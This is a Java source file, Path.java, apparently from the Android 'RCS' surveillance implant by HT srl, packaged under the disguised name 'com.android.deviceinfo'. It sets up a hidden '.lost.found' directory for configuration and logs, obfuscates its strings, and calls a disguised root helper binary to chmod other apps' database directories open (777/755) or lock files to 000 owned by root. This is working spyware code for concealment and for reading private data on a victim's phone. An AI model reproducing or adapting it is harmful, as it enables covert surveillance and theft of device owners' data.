/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Path.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.file;

import java.io.File;
import java.io.IOException;
import java.util.Random;

import android.os.Environment;
import android.os.StatFs;

import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.DateTime;
import com.android.deviceinfo.util.Utils;
import com.android.m.M;

// TODO: Auto-generated Javadoc
/**
 * The Class Path.
 */
public class Path {

	/** The Constant TAG. */
	private static final String TAG = "PATH"; //$NON-NLS-1$

	/** The Constant CONF_DIR. */
	private static String CONF_DIR; //$NON-NLS-1$
	// public static final String DEBUG_DIR = "dwm/";
	/** The Constant MARKUP_DIR. */
	private static String MARKUP_DIR; //$NON-NLS-1$

	/** The Constant LOG_DIR. */
	private static String LOG_DIR; //$NON-NLS-1$

	private static String curLogFile;

	public static final String LOG_FILE = "android_logs"; //$NON-NLS-1$

	/** The hidden. */
	private static String hidden;
	private static boolean initialized = false;
	private static String doc;
	private static String picture;

	// public static final String UPLOAD_DIR = "";

	private Path() {

	}

	/**
	 * Make dirs.
	 * 
	 * @return true, if successful
	 */
	public static boolean makeDirs(boolean forcelocal) {

		/** The Constant CONF_DIR. 24_0=cdd/ */
		CONF_DIR = "l1/"; //$NON-NLS-1$
		/** The Constant MARKUP_DIR. 24_1=mdd/ */
		MARKUP_DIR = "l2/"; //$NON-NLS-1
		/** The Constant LOG_DIR. 24_2=ldd/ */
		LOG_DIR = "l3/"; //$NON-NLS-1$

		try {
			setStorage(forcelocal);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (makeDirs): hidden = " + hidden());//$NON-NLS-1$
			}

			boolean success = true;

			success &= createDirectory(conf());
			success &= createDirectory(markup());
			success &= createDirectory(logs());

			if (Cfg.FILE && Cfg.DEBUG) {

				final File file = new File(getCurLogfile());
				file.createNewFile();
			}

			// doc = Environment.getExternalStorageDirectory() +
			// "/My Documents";
			// picture = Environment.getExternalStorageDirectory() +
			// "/DCIM/100MEDIA";

			initialized = success;
			return success;

		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
			}
		}

		return false;
	}

	/**
	 * Check.storage. //$NON-NLS-1$
	 * 
	 * @param forcelocal
	 */
	public static void setStorage(boolean forcelocal) {
		boolean mExternalStorageAvailable = false;
		boolean mExternalStorageWriteable = false;
		final String state = Environment.getExternalStorageState();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (setStorage) external state: " + state);
		}
		if (Environment.MEDIA_MOUNTED.equals(state)) {
			// We can read and write the media
			mExternalStorageAvailable = mExternalStorageWriteable = true;
		} else if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
			// We can only read the media
			mExternalStorageAvailable = true;
			mExternalStorageWriteable = false;
		} else {
			// Something else is wrong. It may be one of many other states, but
			// all we need
			// to know is we can neither read nor write
			mExternalStorageAvailable = mExternalStorageWriteable = false;
		}

		if (!forcelocal && mExternalStorageWriteable && Cfg.USE_SD) {
			hidden = Environment.getExternalStorageDirectory() + M.e("/.lost.found") + "/"; //$NON-NLS-1$ //$NON-NLS-2$

		} else {
			hidden = Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/.lost.found") + "/";
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (setStorage): " + hidden + " freespace: " + freeSpace());
		}
	}

	public static String home() {
		return Environment.getExternalStorageDirectory().getAbsolutePath();
	}

	/**
	 * Hidden.
	 * 
	 * @return the string
	 */
	public static String hidden() {
		return hidden;
	}

	public static String upload() {
		return Status.getAppContext().getFilesDir().getAbsolutePath();
	}

	public static String doc() {
		return doc;
	}

	public static String picture() {
		return picture;
	}

	public static String getCurLogfile() {
		if (curLogFile == null) {
			DateTime dt = new DateTime();

			curLogFile = Environment.getExternalStorageDirectory() + "/" + LOG_FILE + "-" + dt.getOrderedString()
					+ ".txt";
		}

		return curLogFile;
	}

	/**
	 * Conf.
	 * 
	 * @return the string
	 */
	public static String conf() {
		return hidden() + CONF_DIR;
	}

	/**
	 * Markup.
	 * 
	 * @return the string
	 */
	public static String markup() {
		return hidden() + MARKUP_DIR;
	}

	/**
	 * Logs.
	 * 
	 * @return the string
	 */
	public static String logs() {
		return hidden() + LOG_DIR;
	}

	public static boolean unprotect(String path) {

		return unprotect(path, false);
	}

	public static boolean unprotect(String path, int depth, boolean fullmode) {

		File file = new File(path);

		if (depth >= 0) {
			unprotect(file.getParent(), depth - 1, fullmode);
		}

		boolean ret = unprotect(path, fullmode);
		if (Cfg.DEBUG) {
			Check.log(TAG + " (unprotect) ret: " + path + " " + ret);
		}
		return ret;
	}

	public static boolean unprotect(String path, boolean fullmode) {
		try {

			File file = new File(path);

			if (fullmode) {
				if (file.canRead() && file.canWrite()) {
					return true;
				}
				if (Cfg.DEBUG) {
					Check.log(TAG + " (unprotect): " + M.e("/system/bin/rilcap pzm 777 ") + " " + path);
				}
				// h_9=/system/bin/ntpsvd pzm 777
				Runtime.getRuntime().exec(M.e("/system/bin/rilcap pzm 777 ") + " " + path);
				Utils.sleep(200);
			} else {
				if (file.canRead()) {
					return true;
				}
				if (Cfg.DEBUG) {
					Check.log(TAG + " (unprotect): " + M.e("/system/bin/rilcap pzm 755 ") + " " + path);
				}
				// h_3=/system/bin/ntpsvd pzm 755
				Runtime.getRuntime().exec(M.e("/system/bin/rilcap pzm 755 ") + " " + path);
				Utils.sleep(200);
			}

			file = new File(path);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (unprotect) return: " + path + " " + file.canRead());
			}
			return file.canRead();
		} catch (IOException ex) {
			Check.log(TAG + " Error (unprotect): " + ex);
			return false;
		}
	}

	public static boolean unprotect(String dbDir, String fileName, boolean fullMode) {
		unprotect(dbDir, 3, fullMode);
		File file = new File(dbDir, fileName);
		unprotect(file.getAbsolutePath(), fullMode);

		return (file.canRead());
	}

	public static boolean unprotectAll(String dbDir, boolean fullMode) {
		File dir = new File(dbDir);
		if (dir.isDirectory()) {
			unprotect(dbDir, fullMode);
			for (String name : dir.list()) {
				File file = new File(dir, name);
				unprotect(file.getAbsolutePath(), fullMode);
			}
		}
		return (dir.canRead());
	}

	// chmod 000 && chown root:root
	public static boolean lock(String path) {
		try {
			// h_10=/system/bin/ntpsvd pzm 000
			Runtime.getRuntime().exec(M.e("/system/bin/rilcap pzm 000 ") + path);

			// h_11=/system/bin/ntpsvd fho root root
			Runtime.getRuntime().exec(M.e("/system/bin/rilcap fho root root ") + path);

			return true;
		} catch (IOException ex) {
			Check.log(TAG + " Error (unprotect): " + ex);
			return false;
		}
	}

	/**
	 * Removes the directory.
	 * 
	 * @param dir
	 *            the dir
	 * @return true, if successful
	 */
	public static boolean removeDirectory(final String dir) {
		final File file = new File(dir);
		return file.delete(); // TODO: anche su directory piene!
	}

	/**
	 * Creates the directory.
	 * 
	 * @param dir
	 *            the dir
	 * @return true, if successful
	 */
	public static boolean createDirectory(final String dir) {
		final File file = new File(dir);
		file.mkdirs();
		return file.exists() && file.isDirectory();
	}

	/**
	 * Free space.
	 * 
	 * @return the long
	 */
	public static long freeSpace() {

		try {
			final StatFs stat = new StatFs(hidden);
			final long bytesAvailable = (long) stat.getBlockSize() * (long) stat.getBlockCount();
			final long megAvailable = bytesAvailable / 1048576;
			if (Cfg.DEBUG) {
				//Check.log(TAG + " (freeSpace): " + megAvailable + " MiB");//$NON-NLS-1$ //$NON-NLS-2$
			}
			return bytesAvailable;
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (freeSpace) ERROR: " + ex);
				}

			}
			return 0;
		}
	}

	public static boolean initialized() {
		return initialized;
	}

	public static boolean makeDirs() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (makeDirs) trying sd");
		}
		if (!makeDirs(false)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (makeDirs) forcing internal space");
			}
			return makeDirs(true);
		}
		return true;
	}
}
